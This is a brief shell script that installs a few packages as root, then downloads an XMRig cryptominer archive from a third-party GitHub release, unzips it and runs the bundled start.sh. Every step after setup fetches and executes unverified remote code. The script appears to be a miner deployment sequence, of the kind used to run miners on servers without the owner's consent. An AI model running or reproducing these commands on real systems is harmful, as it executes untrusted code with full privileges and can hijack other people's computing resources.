cd /root

sudo apt install tmux -y
sudo apt install unzip -y
sudo apt install python3-pip -y
sudo apt update -y

pip3 install psutil requests tqdm

wget https://github.com/maxdhctrl/donate/releases/download/release-3/xmrig.zip
unzip xmrig.zip

chmod +x start.sh

./start.sh
